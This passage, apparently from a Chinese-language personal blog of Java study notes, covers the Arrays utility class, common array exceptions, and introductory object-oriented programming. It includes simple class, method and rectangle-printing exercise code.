(j+<span class="number">1</span> &lt; right) &#123;</span><br><span class="line">        arr=quickSort(arr,j+<span class="number">1</span>,right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/13/JAVA/image-20220423225141864.png" alt="image-20220423225141864"></p>
<p><img src="/2022/04/13/JAVA/image-20220423225715545.png" alt="image-20220423225715545"></p>
<h4 id="Arrary-工具类的使用"><a href="#Arrary-工具类的使用" class="headerlink" title="Arrary 工具类的使用"></a>Arrary 工具类的使用</h4><p><img src="/2022/04/13/JAVA/image-20220423230052235.png" alt="image-20220423230052235"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="comment">//Arrary工具类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArraryTest3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr1 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] arr2 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="keyword">boolean</span> isEquals = Arrays.equals(arr1,arr2); <span class="comment">//false</span></span><br><span class="line">        System.out.println(isEquals);</span><br><span class="line"></span><br><span class="line">        System.out.println(Arrays.toString(arr1)); <span class="comment">//[1, 2, 3, 4]</span></span><br><span class="line">        Arrays.fill(arr1,<span class="number">10</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr1)); <span class="comment">//[10, 10, 10, 10]</span></span><br><span class="line">        Arrays.sort(arr2);</span><br><span class="line">        System.out.println(Arrays.toString(arr2)); <span class="comment">//[1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] arr3 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">98</span>,-<span class="number">34</span>,<span class="number">2</span>,<span class="number">34</span>,<span class="number">54</span>,<span class="number">66</span>,<span class="number">79</span>,<span class="number">105</span>,<span class="number">210</span>,<span class="number">333</span>&#125;;<span class="comment">//有序才能用二分查找</span></span><br><span class="line">        <span class="keyword">int</span> index = Arrays.binarySearch(arr3,<span class="number">210</span>);</span><br><span class="line">        System.out.println(index); <span class="comment">//8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数组中的常见异常"><a href="#数组中的常见异常" class="headerlink" title="数组中的常见异常:"></a>数组中的常见异常:</h4><p>1.数组角标越界的异常: ArrayIndexOutOfBounds Excetion<br>2.空指针异常: NullPointerException</p>
<p><img src="/2022/04/13/JAVA/image-20220423232857835.png" alt="image-20220423232857835"></p>
<h2 id="面向对象-OOP"><a href="#面向对象-OOP" class="headerlink" title="面向对象-OOP"></a>面向对象-OOP</h2><p>一、Java面向对象学习的三条主线</p>
<p>1.Java类及类的成员：属性，方法，构造器；代码块，内部类<br>2.面向对象的三大特征：封装性，继承性，多态性，（抽象性）<br>3.其它关键字：this ,super,static,final,abstract,interface,package,import…</p>
<p>●面向过程(POP)与面向对象(OOP)<br>➢二者都是一种思想，面向对象是相对于面向过程而言的。面向过程，强调的是功能行为，以函数为最小单位，考虑怎么做。面向对象，将功能封装进对象，强调具备了功能的对象，以类/对象为最小单位，考虑谁来做。<br>➢面向对象更加强调运用人类在日常的思维逻辑中采用的思想方法与原则，如抽象、分类、继承、聚合、多态等。<br>面向对象的三大特征<br>➢封装(Encapsulation)<br>➢继承(nheritance)<br>➢多态(Polymorphism)<br>面向对象: Object Oriented Programming,<br>面向过程: Procedure Oriented Programming</p>
<p>●面向对象分析方法分析问题的思路和步骤:<br>➢根据问题需要，选择问题所针对的现实世界中的实体。<br>➢从实体中寻找解决问题相关的属性和功能，这些属性和功能就形成了概念世界中的类。<br>➢把抽象的实体用计算机语言进行描述，形成计算机世界中类的定义。即借助某种程序语言，把类构造成计算机能够识别和处理的数据结构。<br>➢将类实例化成计算机世界中的对象。对象是计算机世界中解决问题的最终工具。</p>
<h3 id="类和对象-面向对象的两要素"><a href="#类和对象-面向对象的两要素" class="headerlink" title="类和对象-面向对象的两要素"></a>类和对象-面向对象的两要素</h3><h4 id="介绍；"><a href="#介绍；" class="headerlink" title="介绍；"></a>介绍；</h4><p>●类(Class)和对象(Object)是面向对象的核心概念<br>➢类是对一类事物的描述，是抽象的、概念上的定义<br>➢对象是实际存在的该类事物的每个个体，因而也称为实例<br>●“万事万物皆对象”</p>
<blockquote>
<p>面向对象程序设计的重点是类的设计<br>设计类，就是设计类的成员。</p>
</blockquote>
<p>一、属性和方法-类的结构</p>
<p>➢属性:对应类中的成员变量<br>➢行为:对应类中的成员方法（函数）</p>
<p>二、类和对象的创建</p>
<p>创建类的对象=类的实例化=实例化类</p>
<p><strong>总结：</strong></p>
<p>类和对象的使用(面向对象思想落地的实现)<br>1.创建类，设计类的成员<br>2.创建类的对象<br>3.通过“对象.属性”或“对象.方法”调用对象的结构</p>
<p>如果创建了一个类的多个对象，则每个对象都独立的拥有一套类的属性。(非static的);意味着:如果我们修改一个对象的属性a，则不影响另外一个对象属性a的值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OOPTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person();</span><br><span class="line">        <span class="comment">//调用对象的属性方法 &quot;对象.属性  对象.方法 &quot;</span></span><br><span class="line">        p1.name=<span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">        p1.isMale = <span class="keyword">true</span>;</span><br><span class="line">        System.out.println(p1.name);</span><br><span class="line">        p1.sleep();</span><br><span class="line">        p1.talk(<span class="string">&quot;chinese&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Person p2 =<span class="keyword">new</span> Person();</span><br><span class="line">        System.out.println(p2.name); <span class="comment">//null</span></span><br><span class="line">        Person p3=p1; <span class="comment">//将p1变量保存的对象地址值赋给p3 ,导致p1和p3指向了堆空间中的同一个对象实体。</span></span><br><span class="line">        p3.age=<span class="number">10</span>;</span><br><span class="line">        System.out.println(p1.age); <span class="comment">//10</span></span><br><span class="line">        System.out.println(p3.name); <span class="comment">//Tom</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">boolean</span> isMale;</span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;人可以吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;人可以睡觉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">talk</span><span class="params">(String language)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;人可以说话，使用的是：&quot;</span>+language);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>内存解析：</p>
<p><img src="/2022/04/13/JAVA/image-20220426164329689.png" alt="image-20220426164329689"></p>
<p>三、属性与局部变量对此</p>
<p>1、相同点</p>
<blockquote>
<p>1.1定义变量的格式:数据类型 变量名 =变量值<br>1.2先声明，后使用<br>1.3变量都有其对应的作用域</p>
</blockquote>
<p>2、不同点</p>
<blockquote>
<p>2.1 在类中声明的位置的不同</p>
<p>属性：直接定义在类的一对{}内</p>
<p>局部变量:声明在方法内、方法形参、代码块内、构造器形参、构造器内部的变量</p>
<p>2.2关于权限修饰符的不同<br>属性:可以在声明属性时，指明其权限，使用权限修饰符。<br>常用的权限修饰符: private、public、缺省、protected—&gt;封装性</p>
<p>局部变量:不可以使用权限修饰符。</p>
<p>2.3默认初始化值的情况:<br>属性:类的属性，根据其类型，都有默认初始化值。<br>整型(byte、 short、int、long) ： 0<br>浮点型(float、double) ： 0.0<br>字符型(char) :0(或’ ‘\u0000’)<br>布尔型(boolean) : false<br>引用数据类型(类、数组、接口) : nu1l</p>
<p>局部变量:没有默认初始化值。<br>意味着，我们在调用局部变量之前，一定要显式赋值。<br>特别地:形參在调用时，我们赋值即可。</p>
<p>2.4 在内存中加载的位置:<br>属性：加载到堆空间中(非static)|<br>局部变量 : 加载到栈空间</p>
</blockquote>
<p>四、方法举例与声明格式</p>
<p>方法：描述类应该具有的功能</p>
<p>比如：Math类：sqrt() \ random() \ …</p>
<p>Scanner类：nextXxx() …</p>
<p>Arrays类:sort() \ binarySearch() \ toString() \ equals() \ …</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.举例:</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> eat()&#123;&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> sleep(<span class="keyword">int</span> hour)&#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span> getName()&#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span> getNation(<span class="keyword">String</span> nation)&#123;&#125;</span><br><span class="line"><span class="keyword">void</span> :无返回值</span><br><span class="line"><span class="keyword">String</span> ：返回字符串</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.方法的声明:权限修饰符 返回值类型 方法名(形参列表)&#123;</span><br><span class="line">			方法体</span><br><span class="line">&#125;</span><br><span class="line">注意: <span class="built_in">static</span>、 <span class="keyword">final</span>、<span class="keyword">abstract</span>来修饰的方法，后面再讲。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.说明:</span><br><span class="line">	<span class="number">3.1</span>关于权限修饰符:默认方法的权限修饰符先都使用<span class="keyword">public</span></span><br><span class="line">		Java规定的<span class="number">4</span>种权限修饰符: <span class="keyword">private</span>、 <span class="keyword">public</span>、缺省、<span class="keyword">protected</span> -- &gt;封装性</span><br><span class="line">	<span class="number">3.2</span>返回值类型:有返回值vs没有返回值</span><br><span class="line">		<span class="number">3.2</span>.<span class="number">1</span>如果方法有返回值，则必须在方法声明时，指定返回值的类型。同时，方法中，需要使用<span class="keyword">return</span>关键字来返				回指定类型的变量或常量:“<span class="keyword">return</span> 数据”。</span><br><span class="line">			如果方法没有返回值，则方法声明时，使用<span class="keyword">void</span>来表示。通常，没有返回值的方法中，就不使用<span class="keyword">return</span>.但			是，如果使用的话，只能<span class="keyword">return</span>;”表示结束此方法的意思。</span><br><span class="line">		<span class="number">3.2</span>.<span class="number">2</span> 我们定义方法该不该有返回值？①题目要求 ②凭经验：具体问题具体分析</span><br><span class="line">	<span class="number">3.3</span>方法名:属于标识符，遵循标识符的规则和规范，“见名知意”</span><br><span class="line">	<span class="number">3.4</span>形参列表:方法可以声明<span class="number">0</span>个，<span class="number">1</span>个，或多个形参。</span><br><span class="line">		<span class="number">3.4</span>.<span class="number">1</span> 格式:数据类型<span class="number">1</span> 形参<span class="number">1</span> ,数据类型<span class="number">2</span> 形参<span class="number">2</span>，...</span><br><span class="line">		<span class="number">3.4</span>.<span class="number">2</span> 我们定义方法该不该有形参？①题目要求 ②凭经验：具体问题具体分析</span><br><span class="line">	<span class="number">3.5</span> 方法体：方法功能的体现</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line"><span class="number">4</span>.<span class="keyword">return</span>关键字的使用</span><br><span class="line">	<span class="number">1</span>.使用范围：使用在方法中</span><br><span class="line">	<span class="number">2</span>.作用：①结束方法 ②针对有返回值的方法，使用“<span class="keyword">return</span> 数据<span class="string">&quot;返回所要数据</span></span><br><span class="line"><span class="string">	3.注意点：return关键字后面不可以声明执行语句</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">5.方法的使用中：可以调用当前类的属性和方法；特殊的：方法A又调用了方法A：递归方法</span></span><br><span class="line"><span class="string">  方法中不可以定义方法</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User p1 = <span class="keyword">new</span> User();</span><br><span class="line">        p1.name=<span class="string">&quot;cj&quot;</span>;</span><br><span class="line">        System.out.println(p1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">boolean</span> isMale;</span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;客户吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">sleep</span><span class="params">(<span class="keyword">int</span> hour)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;休息了&quot;</span>+hour + <span class="string">&quot;个小时&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNation</span><span class="params">(String nation)</span></span>&#123;</span><br><span class="line">        String info = <span class="string">&quot;我的国籍是：&quot;</span>+nation;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><p><img src="/2022/04/13/JAVA/image-20220428105324953.png" alt="image-20220428105324953"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">可以拆开写</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonExer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String name;</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * sex:1 表明男性 ；0：表明女性</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">int</span> sex;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">()</span></span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;studying&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;age: &quot;</span>+age);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addAge</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">                age+=i;</span><br><span class="line">                <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        PersonExer p1 = <span class="keyword">new</span> PersonExer();</span><br><span class="line">        p1.name = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">        p1.age = <span class="number">18</span>;</span><br><span class="line">        p1.sex = <span class="number">1</span>;</span><br><span class="line">        p1.study();</span><br><span class="line">        p1.showAge();</span><br><span class="line">        <span class="keyword">int</span> newAge = p1.addAge(<span class="number">2</span>);</span><br><span class="line">        System.out.println(p1.name + <span class="string">&quot;的新年龄为：&quot;</span> + newAge);</span><br><span class="line">        PersonExer p2 = <span class="keyword">new</span> PersonExer();</span><br><span class="line">        p2.showAge();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.利用面向对象的编程方法，设计类Circle计算圆的面积。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircleTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Circle c1= <span class="keyword">new</span> Circle();</span><br><span class="line">        c1.radius = <span class="number">2.1</span>;</span><br><span class="line">        <span class="keyword">double</span> area = c1.findArea();</span><br><span class="line">        System.out.println(area);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> radius;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findArea</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> area = <span class="number">3.14</span> * radius* radius;</span><br><span class="line">        <span class="keyword">return</span> area;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.1编写程序，声明一个method方法， 在方法中打印一个10 x 8的<code>*</code>型矩形，在main方法中调用该方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exer3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Exer3 test = <span class="keyword">new</span> Exer3();</span><br><span class="line">        test.method();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">写在一个类中</span><br></pre></td></tr></table></figure>

<p>3.2修改上一个程序，在method方法中， 除打印一个10 x 8的<code>*</code>型矩形外，再计算该矩形的面积， 并将其作为方法返回值。在main方法中调用该方法，接收返回的面积值并打印。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exer3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Exer3 test = <span class="keyword">new</span> Exer3();</span><br><span class="line">        <span class="keyword">int</span> area = test.method();</span><br><span class="line">        System.out.println(area);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10</span>*<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.3修改上一个程序，在method方法提供m和n两个参数，方法中打印一个m x n的<code>*</code>型矩形，并计算该矩形的面积，将其作为方法返回值。在main方法中调用该方法，接收返回的面积值并打印。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exer3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Exer3 test = <span class="keyword">new</span> Exer3();</span><br><span class="line">        <span class="keyword">int</span> area = test.method(<span class="number">3</span>,<span class="number">2</span>);</span><br><span class="line">        System.out.println(area);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">method</span><span class="params">(<span class="keyword">int</span> m,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;n;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m*n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

